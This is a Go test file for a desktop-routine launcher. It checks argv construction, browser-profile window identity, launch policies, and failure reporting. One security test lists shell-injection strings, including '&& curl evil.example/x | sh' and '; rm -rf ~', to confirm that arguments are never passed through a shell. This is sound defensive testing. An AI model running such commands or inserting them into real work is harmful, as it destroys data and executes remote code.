package routine

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/rpickz/jarvix/internal/desktop"
	"github.com/rpickz/jarvix/internal/desktopentry"
	"github.com/rpickz/jarvix/internal/placement"
)

// This file is issue #175's launching half: what a step opens, what argv that
// produces, whether it adopts a window or starts one, and what the run says
// when none of that works. Nothing here starts a process — the exec seam is
// the fakeLauncher in runner_test.go, and every claim about what would have
// run is a claim about a recorded slice.

// oneStep is a routine of a single step on workspace one, for the tests that
// are about launching rather than placing.
func oneStep(step Step) []Definition {
	step.Workspace = 1
	return []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{step}}}
}

// TestArgumentsReachExecveLiterally is the security pin the ticket asks for.
//
// Every value below is syntax to a shell and characters to execve, and the
// difference is the whole design: these argv are built as a list, appended to
// as a list, and handed to exec.Command as a list. There is no point at which
// they are joined into a string, so there is nothing to quote and nothing to
// get wrong. (The same values written into `[[scripts]]` would be a shell
// line — that is what [[scripts]] is for, and why steps deliberately have no
// command-line form.)
func TestArgumentsReachExecveLiterally(t *testing.T) {
	dangerous := []string{
		"--profile-directory=Profile 3",
		"; rm -rf ~",
		"&& curl evil.example/x | sh",
		"`id`",
		"$(rm -rf /tmp/x)",
		"--url=http://x/?a=b&c=d",
		"*",
		"~/notes",
		"'quoted'",
		"line\nbreak",
	}
	comp := desktop.NewFakeCompositor()
	appearing := desktop.Window{Address: "0x1", Class: "chromium", Workspace: 1}
	r, _, launcher := newTestRunnerOn(comp, oneStep(Step{App: "chromium", Args: dangerous}),
		nil, func(int) { comp.SetWindows(appearing) }, installedResolver())
	if _, err := r.Run(context.Background(), "test"); err != nil {
		t.Fatal(err)
	}

	started := launcher.launches()
	if len(started) != 1 {
		t.Fatalf("launched %+v, want exactly one", started)
	}
	want := append([]string{"/usr/bin/chromium"}, dangerous...)
	if !slices.Equal(started[0].Argv, want) {
		t.Fatalf("argv =\n  %q\nwant\n  %q", started[0].Argv, want)
	}
	// And each dangerous value is ONE element: a shell would have split
	// several of these into many, or replaced them with the output of a
	// command. Asserting the count as well as the contents is what catches a
	// future change that joins and re-splits.
	if len(started[0].Argv) != len(dangerous)+1 {
		t.Errorf("argv has %d elements, want %d — something split an argument",
			len(started[0].Argv), len(dangerous)+1)
	}
}

// TestTwoProfilesOfOneBinaryAreTwoWindows is the Chromium case, which is the
// hard half of this ticket. Both steps run the same binary; only the
// arguments differ, and on the running desktop the two windows are
// indistinguishable by class, PID or /proc/<pid>/cmdline because Chromium
// serves every profile from one process.
//
// The mechanism is to decide the identity BEFORE the window exists: each step
// launches with its own `--class`, so each recognises its own window
// afterwards. The pin is that the two argv differ in both the profile and the
// class, and that the two steps end up on two different windows.
func TestTwoProfilesOfOneBinaryAreTwoWindows(t *testing.T) {
	defs := []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "chromium", Identity: "personal", Args: []string{"--profile-directory=Profile 3"},
			Placement: placement.Placement{Workspace: 1}},
		{App: "chromium", Identity: "work", Args: []string{"--profile-directory=Default"},
			Placement: placement.Placement{Workspace: 2}},
	}}}
	comp := desktop.NewFakeCompositor()
	windows := []desktop.Window{
		{Address: "0x1", Class: "personal", Workspace: 1},
		{Address: "0x2", Class: "work", Workspace: 2},
	}
	r, _, launcher := newTestRunnerOn(comp, defs, nil, func(poll int) {
		if poll >= 1 && poll <= len(windows) {
			comp.SetWindows(windows[:poll]...)
		}
	}, installedResolver())
	summary, err := r.Run(context.Background(), "test")
	if err != nil {
		t.Fatal(err)
	}
	if summary != "Test: all two apps placed." {
		t.Fatalf("summary = %q", summary)
	}

	started := launcher.launches()
	if len(started) != 2 {
		t.Fatalf("launched %+v, want two", started)
	}
	for i, want := range [][]string{
		{"/usr/bin/chromium", "--profile-directory=Profile 3", "--class=personal"},
		{"/usr/bin/chromium", "--profile-directory=Default", "--class=work"},
	} {
		if !slices.Equal(started[i].Argv, want) {
			t.Errorf("step %d launched %q, want %q", i+1, started[i].Argv, want)
		}
	}
	// Two windows, two placements, and they are not the same window.
	var moved []desktop.FakeAction
	for _, a := range comp.Actions() {
		if a.Verb == "move" {
			moved = append(moved, a)
		}
	}
	if len(moved) != 2 || moved[0].Address == moved[1].Address {
		t.Fatalf("moves = %+v, want two different windows", moved)
	}
	if moved[0].Workspace != 1 || moved[1].Workspace != 2 {
		t.Errorf("moves = %+v, want the personal profile on 1 and work on 2", moved)
	}
}

// TestTwoStepsThatCouldNotBeToldApartAreRefused: the same pair WITHOUT an
// identity is refused when the routine is saved, because no run could get it
// right. Half the time the first step would adopt the second profile's window
// and the layout would come out backwards, with nothing on screen to explain
// it — a coin toss is worse than a refusal.
func TestTwoStepsThatCouldNotBeToldApartAreRefused(t *testing.T) {
	defs := []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "chromium", Args: []string{"--profile-directory=Profile 3"},
			Placement: placement.Placement{Workspace: 1}},
		{App: "chromium", Args: []string{"--profile-directory=Default"},
			Placement: placement.Placement{Workspace: 2}},
	}}}
	problems := ProblemsWith(defs, *installedResolver())
	if len(problems) != 1 {
		t.Fatalf("problems = %v, want exactly the ambiguity", problems)
	}
	for _, want := range []string{"steps[0] and steps[1]", "identity", "match"} {
		if !strings.Contains(problems[0], want) {
			t.Errorf("problem = %q, want it to mention %q", problems[0], want)
		}
	}

	// Two steps launching the SAME thing the same way are not ambiguous: two
	// terminals are interchangeable, and the runner claims windows one at a
	// time so each step gets its own.
	same := []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "kitty", Placement: placement.Placement{Workspace: 1}},
		{App: "kitty", Placement: placement.Placement{Workspace: 2}},
	}}}
	if problems := ProblemsWith(same, *installedResolver()); len(problems) != 0 {
		t.Errorf("two identical steps were refused: %v", problems)
	}
}

// TestAStepCanInsistOnAFreshWindow is the user's per-step choice. The same
// routine, run twice, with one step that adopts and one that does not.
func TestAStepCanInsistOnAFreshWindow(t *testing.T) {
	defs := []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "chromium", Args: []string{"--restore"}, Match: "chromium",
			Placement: placement.Placement{Workspace: 1}},
		{App: "kitty", Args: []string{"--hold"}, Match: "kitty", Launch: LaunchAlways,
			Placement: placement.Placement{Workspace: 2}},
	}}}
	// Both are already open.
	comp := desktop.NewFakeCompositor(
		desktop.Window{Address: "0x1", Class: "chromium", Workspace: 1},
		desktop.Window{Address: "0x2", Class: "kitty", Workspace: 2},
	)
	fresh := desktop.Window{Address: "0x3", Class: "kitty", Workspace: 2}
	r, _, launcher := newTestRunnerOn(comp, defs, nil, func(int) {
		comp.SetWindows(
			desktop.Window{Address: "0x1", Class: "chromium", Workspace: 1},
			desktop.Window{Address: "0x2", Class: "kitty", Workspace: 2},
			fresh)
	}, installedResolver())
	if _, err := r.Run(context.Background(), "test"); err != nil {
		t.Fatal(err)
	}

	started := launcher.launches()
	if len(started) != 1 || started[0].Label != "kitty" {
		t.Fatalf("launched %+v, want only the step that asked for a fresh window", started)
	}
	// The adopting step placed the window that was already there; the
	// insisting step placed the new one, not the old one.
	var moved []desktop.FakeAction
	for _, a := range comp.Actions() {
		if a.Verb == "move" {
			moved = append(moved, a)
		}
	}
	if len(moved) != 2 || moved[0].Address != "0x1" || moved[1].Address != "0x3" {
		t.Fatalf("moves = %+v, want the adopted browser and the NEW terminal", moved)
	}
}

// TestTheReportSaysWhichFailureItWas is the reporting criterion, all four
// kinds through one run: not installed, launched-and-nothing-appeared,
// launched-and-nothing-matched, and a step that worked.
//
// Before this, all three failures said "X's window did not appear", so a user
// whose routine reported `placed=3 failed=3` could not tell whether to
// install something, wait longer, or fix a match.
func TestTheReportSaysWhichFailureItWas(t *testing.T) {
	defs := []Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "discord", Match: "discord", Placement: placement.Placement{Workspace: 1}},
		{App: "chromium", Args: []string{"--app=https://facebook.com"}, Match: "facebook",
			Placement: placement.Placement{Workspace: 1}},
		{App: "ghostwindow", Args: []string{"--headless"}, Match: "ghostwindow",
			Placement: placement.Placement{Workspace: 1}},
		{App: "kitty", Match: "kitty", Placement: placement.Placement{Workspace: 1}},
	}}}
	comp := desktop.NewFakeCompositor(desktop.Window{Address: "0xk", Class: "kitty", Workspace: 1})
	// Step two's launch maps a window — just not one matching "facebook",
	// which is exactly the user's reported step.
	r, _, _ := newTestRunnerOn(comp, defs, nil, func(poll int) {
		if poll == 1 {
			comp.SetWindows(
				desktop.Window{Address: "0xk", Class: "kitty", Workspace: 1},
				desktop.Window{Address: "0xc", Class: "chromium", Workspace: 1})
		}
	}, missingResolver("chromium", "ghostwindow", "kitty"))

	log := &eventLog{}
	r.publish = log.publish
	summary, err := r.Run(context.Background(), "test")
	if err != nil {
		t.Fatal(err)
	}

	for _, want := range []string{
		"discord is not installed",
		`chromium opened a window, but nothing matched "facebook"`,
		"ghostwindow opened no window within 8 seconds",
	} {
		if !strings.Contains(summary, want) {
			t.Errorf("summary = %q\nwant it to contain %q", summary, want)
		}
	}
	if !strings.Contains(summary, "one app placed") {
		t.Errorf("summary = %q, want the working step still counted", summary)
	}

	// The feed carries the KIND beside the sentence, so a surface can offer a
	// fix without reading English out of the detail line.
	want := []Failure{FailureNotInstalled, FailureNoMatch, FailureNoWindow, ""}
	var got []Failure
	for i, name := range log.names() {
		if name != "routine.step" {
			continue
		}
		data := log.at(i)
		kind, _ := data["failure"].(string)
		got = append(got, Failure(kind))
	}
	if !slices.Equal(got, want) {
		t.Errorf("published failure kinds = %v, want %v", got, want)
	}
}

// TestNothingIsLaunchedForAnUninstalledStep: "not installed" is decided
// before anything is started, so a routine naming an application the machine
// does not have costs nothing and waits for nothing.
func TestNothingIsLaunchedForAnUninstalledStep(t *testing.T) {
	comp := desktop.NewFakeCompositor()
	r, _, launcher := newTestRunnerOn(comp, oneStep(Step{App: "discord", Args: []string{"--x"}}),
		nil, nil, missingResolver())
	summary, err := r.Run(context.Background(), "test")
	if err != nil {
		t.Fatal(err)
	}
	if len(launcher.launches()) != 0 {
		t.Errorf("launched %+v for an application that is not installed", launcher.launches())
	}
	for _, a := range comp.Actions() {
		if a.Verb == "spawn" {
			t.Errorf("dispatched a spawn for an application that is not installed: %+v", a)
		}
	}
	if !strings.Contains(summary, "discord is not installed") {
		t.Errorf("summary = %q", summary)
	}
}

// TestABareProgramStillGoesThroughTheCompositor pins the deliberate asymmetry
// (see Runner.startStep): a step that carries nothing new keeps the launch
// path every routine in the field already uses, because that path starts the
// application as a child of the compositor with the graphical session's
// environment. Changing it for steps that asked for nothing would be spending
// a working feature on symmetry.
func TestABareProgramStillGoesThroughTheCompositor(t *testing.T) {
	comp := desktop.NewFakeCompositor()
	r, _, launcher := newTestRunnerOn(comp, oneStep(Step{App: "kitty"}), nil,
		func(int) { comp.SetWindows(desktop.Window{Address: "0x1", Class: "kitty", Workspace: 1}) },
		installedResolver())
	if _, err := r.Run(context.Background(), "test"); err != nil {
		t.Fatal(err)
	}
	if len(launcher.launches()) != 0 {
		t.Errorf("a bare program was started directly: %+v", launcher.launches())
	}
	spawned := 0
	for _, a := range comp.Actions() {
		if a.Verb == "spawn" && a.Program == "kitty" {
			spawned++
		}
	}
	if spawned != 1 {
		t.Errorf("the compositor was asked to spawn kitty %d times, want once", spawned)
	}
}

// TestAStepMustNameOneThingToLaunch covers the schema's shape rules, each
// with the message a form pins to a field.
func TestAStepMustNameOneThingToLaunch(t *testing.T) {
	for _, tc := range []struct {
		name string
		step Step
		want string
	}{
		{"neither", Step{}, "name the program this step launches"},
		{"both", Step{App: "chromium", DesktopEntry: "ChatGPT"}, "both say what to launch"},
		{"a command line in app", Step{App: "chromium --profile-directory=x"},
			"never through a shell"},
		{"a path in desktop_entry", Step{DesktopEntry: "/usr/share/applications/X.desktop"},
			"never as a path"},
		{"a launch policy nobody wrote", Step{App: "kitty", Launch: "sometimes"},
			"is not a launch policy"},
		{"an identity on a program that has no flag for it",
			Step{App: "signal-desktop", Identity: "notes"}, "takes no flag for choosing its window class"},
		{"an identity on a desktop entry",
			Step{DesktopEntry: "ChatGPT", Identity: "chat"}, "cannot be set on a desktop_entry step"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tc.step.Workspace = 1
			problems := ProblemsWith([]Definition{{
				Name: "test", Phrases: []string{"test"}, Steps: []Step{tc.step},
			}}, *installedResolver())
			joined := strings.Join(problems, "\n")
			if !strings.Contains(joined, tc.want) {
				t.Errorf("problems = %v\nwant one saying %q", problems, tc.want)
			}
		})
	}
}

// TestAMissingDesktopEntryFailsTheLoad is the criterion stated literally: the
// entry is named, the failure happens when the routine is read, and no run
// ever gets far enough to wait eight seconds for a window.
func TestAMissingDesktopEntryFailsTheLoad(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "applications")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "[Desktop Entry]\nName=Signal\nExec=signal-desktop\nType=Application\n"
	if err := os.WriteFile(filepath.Join(dir, "signal-desktop.desktop"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	resolver := Resolver{
		Entries:  desktopentry.Load(dir),
		LookPath: func(string) (string, error) { return "", errors.New("nope") },
	}

	problems := ProblemsWith([]Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{DesktopEntry: "Slack", Placement: placement.Placement{Workspace: 1}},
	}}}, resolver)
	if len(problems) != 1 || !strings.Contains(problems[0], "there is no Slack desktop entry") {
		t.Fatalf("problems = %v, want one naming the entry that is missing", problems)
	}
	// Note what is NOT a load problem: the entry that IS here, whose program
	// is not installed. That is a fact about the machine rather than the
	// file, and it is reported where it can be acted on — see
	// TestWhatTheMachineCannotRunIsRefusedAtSaveTime.
	problems = ProblemsWith([]Definition{{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{DesktopEntry: "signal-desktop", Placement: placement.Placement{Workspace: 1}},
	}}}, resolver)
	if len(problems) != 0 {
		t.Errorf("problems = %v, want the load not to fail over what is installed", problems)
	}
}

// TestWhatTheMachineCannotRunIsReportedNotRefused is the other half of that
// split. InstallProblems is what the window's form and the assistant's config
// tool call when a routine is saved — and what they do with the answer is
// SHOW it, not refuse the save. Whether a program is installed is a fact
// about this machine at this moment; a person authoring a routine for
// something they are about to install, or editing a desktop's routine from a
// laptop, must be able to write it. The refusal that would actually help
// nobody is the one at save; the honest report is at the run.
func TestWhatTheMachineCannotRunIsReportedNotRefused(t *testing.T) {
	def := Definition{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "kitty", Placement: placement.Placement{Workspace: 1}},
		{App: "discord", Placement: placement.Placement{Workspace: 1}},
	}}
	problems := InstallProblems(def, *missingResolver("kitty"))
	if len(problems) != 1 {
		t.Fatalf("problems = %+v, want only the uninstalled step", problems)
	}
	// The same routine is WELL FORMED — nothing about it is refused — which
	// is what lets the save go through carrying the report as a note.
	if refusals := ProblemsWith([]Definition{def}, *missingResolver("kitty")); len(refusals) != 0 {
		t.Errorf("loading refused %v; what is installed must never be a refusal", refusals)
	}
	if problems[0].Step != 1 || problems[0].Field != FieldApp {
		t.Errorf("problem = %+v, want it keyed to steps[1].app", problems[0])
	}
	if problems[0].Message != "discord is not installed" {
		t.Errorf("message = %q", problems[0].Message)
	}
	// A capture placeholder is exempt: #62 writes entries deliberately
	// incomplete for a human to finish, and refusing to save one would break
	// the feature that wrote it.
	placeholder := Definition{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: PlaceholderApp, Placement: placement.Placement{Workspace: 1}},
	}}
	if problems := InstallProblems(placeholder, *missingResolver()); len(problems) != 0 {
		t.Errorf("a captured placeholder was refused: %+v", problems)
	}
}

// terminalEntryResolver builds a resolver over one Terminal=true entry, with
// everything it names installed.
func terminalEntryResolver(t *testing.T, terminal string) Resolver {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "applications")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "[Desktop Entry]\nName=Htop\nExec=htop\nTerminal=true\nType=Application\n"
	if err := os.WriteFile(filepath.Join(dir, "htop.desktop"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return Resolver{Entries: desktopentry.Load(dir), Terminal: terminal,
		LookPath: func(n string) (string, error) { return "/usr/bin/" + n, nil }}
}

// TestATerminalEntryIsLaunchedInsideTheTerminal: an entry that says it needs
// a terminal used to be refused, because launching it bare produced the exact
// failure #175 existed to end — a process that starts, maps nothing, and is
// waited on for eight seconds. #194 supplied the remedy, so the entry's own
// statement about itself is now honoured (ADR 0061).
func TestATerminalEntryIsLaunchedInsideTheTerminal(t *testing.T) {
	target, err := terminalEntryResolver(t, "ghostty").Resolve(Step{DesktopEntry: "htop"})
	if err != nil {
		t.Fatalf("a terminal entry was refused: %v", err)
	}
	want := []string{"/usr/bin/ghostty", "--class=dev.jarvix.htop", "-e", "/usr/bin/htop"}
	if !slices.Equal(target.Argv, want) {
		t.Errorf("argv = %v, want %v", target.Argv, want)
	}
	if !target.InTerminal() || target.Terminal != "ghostty" {
		t.Errorf("target = %+v, want it to say which terminal it opens inside", target)
	}
	if target.FromEntry != "htop" {
		t.Errorf("FromEntry = %q, want the entry it came from", target.FromEntry)
	}
}

// TestATerminalEntryNeedsATerminalJarvixKnows: an unknown terminal is refused
// by name rather than guessed at. Guessing -e would be the same silent
// failure with an extra step — an argument the terminal rejects at start-up.
func TestATerminalEntryNeedsATerminalJarvixKnows(t *testing.T) {
	_, err := terminalEntryResolver(t, "st").Resolve(Step{DesktopEntry: "htop"})
	if err == nil {
		t.Fatal("an unknown terminal resolved")
	}
	if !strings.Contains(err.Error(), "runs in a terminal") ||
		!strings.Contains(err.Error(), "do not know how to run a command inside st") ||
		!strings.Contains(err.Error(), "ghostty") {
		t.Errorf("refusal = %q, want the reason and the terminals that are known", err.Error())
	}
}

// TestIdentityFlagsAreTheOnesTheProgramsAccept guards the curated table. A
// wrong spelling here would be an argument the program rejects at start-up —
// a launch that fails for a reason the user never wrote — so the table is
// only allowed to contain flags someone confirmed.
func TestIdentityFlagsAreTheOnesTheProgramsAccept(t *testing.T) {
	for _, tc := range []struct{ program, flag string }{
		{"chromium", "--class="},
		{"/usr/bin/chromium", "--class="},
		{"google-chrome-stable", "--class="},
		{"firefox", "--class="},
		{"foot", "--app-id="},
		// The terminals come from launchkind's table, which routine defers to
		// rather than keeping a second copy of (#194).
		{"ghostty", "--class="},
		{"alacritty", "--class="},
	} {
		flag, ok := IdentityFlag(tc.program)
		if !ok || flag != tc.flag {
			t.Errorf("IdentityFlag(%q) = %q,%v; want %q", tc.program, flag, ok, tc.flag)
		}
	}
	if _, ok := IdentityFlag("signal-desktop"); ok {
		t.Error("a program with no such flag was reported as taking one")
	}
	if names := IdentityCapablePrograms(); !slices.IsSorted(names) || len(names) == 0 {
		t.Errorf("IdentityCapablePrograms() = %v, want a sorted, non-empty list for the message", names)
	}
}

// TestTheLaunchPolicyIsOneClosedSet: every name the form offers parses, the
// default is absence, and anything else is refused with both spellings in the
// message. One vocabulary, so a value the form can produce is a value the
// loader accepts.
func TestTheLaunchPolicyIsOneClosedSet(t *testing.T) {
	for _, name := range LaunchPolicyNames() {
		policy, err := ParseLaunchPolicy(name)
		if err != nil {
			t.Fatalf("%q is offered but not accepted: %v", name, err)
		}
		if policy.Adopts() != (policy == LaunchIfMissing) {
			t.Errorf("%q adopts = %v", name, policy.Adopts())
		}
	}
	if policy, err := ParseLaunchPolicy("  ALWAYS "); err != nil || policy != LaunchAlways {
		t.Errorf("ParseLaunchPolicy(\"  ALWAYS \") = %q, %v; want it read leniently", policy, err)
	}
	if policy, err := ParseLaunchPolicy(""); err != nil || !policy.Adopts() {
		t.Errorf("the absent policy = %q, %v; want the adopting default", policy, err)
	}
	_, err := ParseLaunchPolicy("maybe")
	if err == nil {
		t.Fatal("an invented policy was accepted")
	}
	for _, want := range LaunchPolicyNames() {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal %q does not offer %q", err.Error(), want)
		}
	}
}

// TestTheDefaultResolverReadsThisMachine: the production resolver is PATH plus
// the XDG applications directories, and pointing those at a temporary
// directory is what makes every other test in this file hermetic. Proving it
// here is what stops that from being an assumption.
func TestTheDefaultResolverReadsThisMachine(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "share")
	apps := filepath.Join(dir, "applications")
	if err := os.MkdirAll(apps, 0o755); err != nil {
		t.Fatal(err)
	}
	body := "[Desktop Entry]\nName=Made Up\nExec=/bin/sh -c true\nType=Application\n"
	if err := os.WriteFile(filepath.Join(apps, "madeup.desktop"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv("XDG_DATA_HOME", dir)
	t.Setenv("XDG_DATA_DIRS", dir)

	target, err := DefaultResolver().Resolve(Step{DesktopEntry: "madeup"})
	if err != nil {
		t.Fatalf("the machine's own resolver could not read an entry it can see: %v", err)
	}
	if target.FromEntry != "madeup" || len(target.Argv) != 3 {
		t.Errorf("resolved to %+v, want the entry's own Exec as an argv", target)
	}
	// And the argv is what a log line would carry, verbatim — never anything
	// that gets executed.
	if !strings.Contains(target.String(), "-c true") {
		t.Errorf("Target.String() = %q, want the argv it would run", target.String())
	}
}

// TestARoutineForAnUninstalledProgramSavesAndReportsAtRunTime is the whole
// corrected contract in one place: authoring is permissive, running is
// honest.
//
// The routine names something this machine does not have. It is well formed,
// so it loads and it saves; the machine's own answer travels as a report the
// user can act on rather than a wall. Then the run — the point where the
// promise is actually being kept or broken — starts nothing, waits for
// nothing, and says the application is not installed, by name, in the
// sentence the user hears.
func TestARoutineForAnUninstalledProgramSavesAndReportsAtRunTime(t *testing.T) {
	def := Definition{Name: "test", Phrases: []string{"test"}, Steps: []Step{
		{App: "not-here-yet", Args: []string{"--profile-directory=Later"},
			Placement: placement.Placement{Workspace: 1}},
	}}
	machine := *missingResolver()

	// Authoring: nothing about the entry is refused.
	if problems := ProblemsWith([]Definition{def}, machine); len(problems) != 0 {
		t.Fatalf("the routine was refused: %v", problems)
	}
	// …and the machine's answer is still available to whoever wants to show
	// it, keyed to the field the user would change.
	notes := InstallProblems(def, machine)
	if len(notes) != 1 || notes[0].Step != 0 || notes[0].Field != FieldApp ||
		notes[0].Message != "not-here-yet is not installed" {
		t.Fatalf("report = %+v, want one naming the step and the program", notes)
	}

	// Running: nothing started, nothing waited for, and the sentence names it.
	comp := desktop.NewFakeCompositor()
	log := &eventLog{}
	r, clk, launcher := newTestRunnerOn(comp, []Definition{def}, log, nil, &machine)
	before := clk.now()
	summary, err := r.Run(context.Background(), "test")
	if err != nil {
		t.Fatal(err)
	}
	if summary != "Test: nothing could be placed — not-here-yet is not installed." {
		t.Errorf("summary = %q", summary)
	}
	if started := launcher.launches(); len(started) != 0 {
		t.Errorf("launched %+v for a program that is not installed", started)
	}
	// No wait was spent: the clock only advances when the runner polls for a
	// window, and a step decided before the launch never gets that far.
	if clk.now() != before {
		t.Errorf("the run waited %s for a program it knew was not installed", clk.now().Sub(before))
	}
	step, ok := log.last("routine.step")
	if !ok || step["failure"] != string(FailureNotInstalled) {
		t.Errorf("routine.step = %v, want the not_installed kind for the feed", step)
	}
}
